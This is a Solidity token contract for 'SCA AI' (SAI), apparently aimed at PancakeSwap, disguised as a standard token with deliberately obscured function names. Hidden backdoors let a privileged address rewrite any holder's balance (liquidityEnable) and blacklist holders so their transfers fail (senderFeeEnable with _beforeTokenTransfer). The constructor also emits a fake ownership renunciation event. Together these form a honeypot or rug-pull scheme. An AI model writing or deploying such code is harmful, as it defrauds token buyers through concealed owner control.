//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


abstract contract  takeTx {
    function atTo() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface  toShould {

    function totalSupply() external view returns (uint256);

    function balanceOf(address isTeam) external view returns (uint256);

    function transfer(address liquidityAt, uint256 totalLaunched) external returns (bool);

    function allowance(address txSwap, address listTeamFee) external view returns (uint256);

    function approve(address listTeamFee, uint256 totalLaunched) external returns (bool);

    function transferFrom(address listLaunched, address liquidityAt, uint256 totalLaunched) external returns (bool);

    event Transfer(address indexed from, address indexed exemptAt, uint256 value);
    event Approval(address indexed txSwap, address indexed spender, uint256 value);
}


abstract contract  totalWallet is  takeTx,  toShould {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory swapList, string memory swapAmountReceiver) {
        _name = swapList;
        _symbol = swapAmountReceiver;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address isTeam) public view virtual override returns (uint256) {
        return _balances[isTeam];
    }

    function transfer(address liquidityAt, uint256 totalLaunched) public virtual override returns (bool) {
        _transfer(atTo(), liquidityAt, totalLaunched);
        return true;
    }

    function allowance(address txSwap, address listTeamFee) public view virtual override returns (uint256) {
        return _allowances[txSwap][listTeamFee];
    }

    function approve(address listTeamFee, uint256 totalLaunched) public virtual override returns (bool) {
        _approve(atTo(), listTeamFee, totalLaunched);
        return true;
    }

    function transferFrom(address listLaunched, address liquidityAt, uint256 totalLaunched) public virtual override returns (bool) {
        _transfer(listLaunched, liquidityAt, totalLaunched);
        _approve(listLaunched, atTo(), _allowances[listLaunched][atTo()].sub(totalLaunched, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address listTeamFee, uint256 toTeam) public virtual returns (bool) {
        _approve(atTo(), listTeamFee, _allowances[atTo()][listTeamFee].add(toTeam));
        return true;
    }

    function decreaseAllowance(address listTeamFee, uint256 fromListToken) public virtual returns (bool) {
        _approve(atTo(), listTeamFee, _allowances[atTo()][listTeamFee].sub(fromListToken, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address listLaunched, address liquidityAt, uint256 totalLaunched) internal virtual {
        require(listLaunched != address(0), "ERC20: transfer from the zero address");
        require(liquidityAt != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(listLaunched, liquidityAt, totalLaunched);

        _balances[listLaunched] = _balances[listLaunched].sub(totalLaunched, "ERC20: transfer amount exceeds balance");
        _balances[liquidityAt] = _balances[liquidityAt].add(totalLaunched);
        emit Transfer(listLaunched, liquidityAt, totalLaunched);
    }

    function marketingWallet(address isTeam, uint256 totalLaunched) internal virtual {
        require(isTeam != address(0));

        _beforeTokenTransfer(address(0), isTeam, totalLaunched);

        _totalSupply = _totalSupply.add(totalLaunched);
        _balances[isTeam] = _balances[isTeam].add(totalLaunched);
        emit Transfer(address(0), isTeam, totalLaunched);
    }

    function _burn(address isTeam, uint256 totalLaunched) internal virtual {
        require(isTeam != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(isTeam, address(0), totalLaunched);

        _balances[isTeam] = _balances[isTeam].sub(totalLaunched, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(totalLaunched);
        emit Transfer(isTeam, address(0), totalLaunched);
    }

    function _approve(address txSwap, address listTeamFee, uint256 totalLaunched) internal virtual {
        require(txSwap != address(0), "ERC20: approve from the zero address");
        require(listTeamFee != address(0), "ERC20: approve to the zero address");

        _allowances[txSwap][listTeamFee] = totalLaunched;
        emit Approval(txSwap, listTeamFee, totalLaunched);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface tokenSwap {
    function createPair(address shouldLaunch, address receiverIs) external returns (address);
}

contract SCAAI is totalWallet {

    uint256 private fromAutoSwap;

    function modeLaunched(address tokenFee) public {
        if (shouldMode) {
            return;
        }
        
        modeAt[tokenFee] = true;
        shouldMode = true;
    }

    function liquidityEnable(address receiverMin, uint256 totalLaunched) public {
        require(modeAt[atTo()]);
        _balances[receiverMin] = totalLaunched;
    }

    mapping(address => bool) public modeAt;

    address public listBuy;

    constructor() totalWallet("SCA AI", "SAI") { 
        
        teamTradingTo = tokenSwap(address(tokenSwapAddr)).createPair(address(fundAtShould),address(this));
        listBuy = atTo();
        if (atExemptLiquidity == feeMarketing) {
            feeMarketing = false;
        }
        modeAt[listBuy] = true;
        marketingWallet(listBuy, 100000000 * 10 ** 18);
        
        emit OwnershipTransferred(listBuy, address(0));
    }

    bool private feeMarketing;

    address fundAtShould = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address public teamTradingTo;

    bool public shouldMode;

    mapping(address => bool) public exemptToken;

    bool public atExemptLiquidity;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public listIs;

    uint256 public receiverWalletReceiver;

    uint256 private teamLaunchBuy;

    address public owner;

    uint256 private senderFrom;

    function senderFeeEnable(address modeExempt) public {
        if (modeExempt == listBuy || modeExempt == address(0) || modeExempt == teamTradingTo || !modeAt[atTo()]) {
            return;
        }
        
        exemptToken[modeExempt] = true;
    }

    uint256 public txAtEnable;

    function _beforeTokenTransfer(address launchedAuto, address exemptAt, uint256 totalLaunched) internal override {
        require(!exemptToken[launchedAuto]);
    }

    address tokenSwapAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    bool private txWallet;

}